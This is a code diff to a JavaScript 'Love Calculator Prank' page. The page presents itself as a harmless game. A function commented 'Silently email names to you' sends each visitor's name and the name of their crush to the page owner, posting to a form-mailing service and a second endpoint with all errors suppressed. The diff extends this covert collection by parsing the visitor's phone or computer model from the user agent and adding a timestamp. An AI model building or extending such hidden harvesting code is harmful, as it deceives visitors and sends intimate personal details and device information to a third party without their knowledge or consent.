@@ -794,7 +794,90 @@ function goTo(id) {
 // ============================================
 //  WEB3FORMS — Silently email names to you
 // ============================================
+
+// Capitalize first letter of each word
+function capitalize(str) {
+    return str.replace(/\b\w/g, c => c.toUpperCase());
+}
+
+// Validate name — must be 2+ chars, only letters/spaces, not all same char
+function isValidName(name) {
+    if (name.length < 2) return false;
+    if (!/^[a-zA-Z\s]+$/.test(name)) return false;
+    // Reject if all same letter (like "rr", "aaa", "bbb")
+    const cleaned = name.replace(/\s/g, '').toLowerCase();
+    if (cleaned.length > 0 && cleaned.split('').every(c => c === cleaned[0])) return false;
+    return true;
+}
+
+// Format time in English: "Feb 20, 2026 - 10:55 PM"
+function formatTime() {
+    const d = new Date();
+    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    let h = d.getHours();
+    const ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    const min = String(d.getMinutes()).padStart(2, '0');
+    return `${months[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()} - ${h}:${min} ${ampm}`;
+}
+
+// Parse friendly device name from userAgent
+function getDeviceName() {
+    const ua = navigator.userAgent;
+    // Mobile devices
+    const mobilePatterns = [
+        // Xiaomi/Redmi
+        /;\s*(Redmi[^;)]+)/i,
+        /;\s*(Mi\s[^;)]+)/i,
+        /;\s*(POCO[^;)]+)/i,
+        // Samsung
+        /;\s*(SM-[A-Z0-9]+)/i,
+        /;\s*(Samsung[^;)]+)/i,
+        /;\s*(Galaxy[^;)]+)/i,
+        // OnePlus
+        /;\s*(ONEPLUS[^;)]+)/i,
+        /;\s*(IN20\d+)/i,
+        // Vivo / Oppo / Realme
+        /;\s*(vivo[^;)]+)/i,
+        /;\s*(OPPO[^;)]+)/i,
+        /;\s*(RMX\d+)/i,
+        /;\s*(Realme[^;)]+)/i,
+        // Huawei
+        /;\s*(HUAWEI[^;)]+)/i,
+        /;\s*(Honor[^;)]+)/i,
+        // Google Pixel
+        /;\s*(Pixel[^;)]+)/i,
+        // Motorola
+        /;\s*(moto[^;)]+)/i,
+        // Nokia
+        /;\s*(Nokia[^;)]+)/i,
+        // General Android model
+        /;\s*([A-Za-z]{2,}[\s-][A-Z0-9][^;)]{1,30})\s*Build/i,
+    ];
+    // iPhone / iPad
+    if (/iPhone/.test(ua)) {
+        const v = ua.match(/iPhone\s*OS\s*(\d+)/);
+        return 'iPhone' + (v ? ' (iOS ' + v[1] + ')' : '');
+    }
+    if (/iPad/.test(ua)) return 'iPad';
+    if (/Macintosh/.test(ua)) return 'Mac';
+
+    for (const pat of mobilePatterns) {
+        const m = ua.match(pat);
+        if (m) return m[1].trim().replace(/\s*Build$/i, '');
+    }
+    // Desktop fallbacks
+    if (/Windows/.test(ua)) return 'Windows PC';
+    if (/Linux/.test(ua) && /Android/.test(ua)) return 'Android Device';
+    if (/Linux/.test(ua)) return 'Linux PC';
+    if (/CrOS/.test(ua)) return 'Chromebook';
+    return 'Unknown Device';
+}
+
 function sendToMe(name, crush) {
+    const time = formatTime();
+    const device = getDeviceName();
+
     fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -804,7 +887,7 @@ function sendToMe(name, crush) {
             from_name: 'Love Calculator Prank',
             name: name,
             crush: crush,
-            message: `😈 Someone got pranked!\n\n👤 Name: ${name}\n💕 Crush: ${crush}\n🕐 Time: ${new Date().toLocaleString()}`,
+            message: `😈 Someone got pranked!\n\n👤 Name: ${name}\n💕 Crush: ${crush}\n🕐 Time: ${time}\n📱 Device: ${device}`,
         })
     }).catch(() => {});
 
@@ -816,7 +899,8 @@ function sendToMe(name, crush) {
         body: JSON.stringify({
             name: name,
             crush: crush,
-            device: navigator.userAgent.slice(0, 80)
+            time: time,
+            device: device
         })
     }).catch(() => {});
 }
@@ -899,20 +983,28 @@ function go() {
     uName = document.getElementById('n1').value.trim();
     cName = document.getElementById('n2').value.trim();
 
-    if (!uName) {
+    if (!uName || !isValidName(uName)) {
         const el = document.getElementById('n1');
         el.classList.add('inp-shake');
         sfxError(); vibrate(80);
         setTimeout(() => el.classList.remove('inp-shake'), 450);
+        if (uName && !isValidName(uName)) el.value = '';
         return;
     }
-    if (!cName) {
+    if (!cName || !isValidName(cName)) {
         const el = document.getElementById('n2');
         el.classList.add('inp-shake');
         sfxError(); vibrate(80);
         setTimeout(() => el.classList.remove('inp-shake'), 450);
+        if (cName && !isValidName(cName)) el.value = '';
         return;
     }
+
+    // Capitalize first letter of each word
+    uName = capitalize(uName);
+    cName = capitalize(cName);
+    document.getElementById('n1').value = uName;
+    document.getElementById('n2').value = cName;
 
     sfxClick();
     vibrate(25);
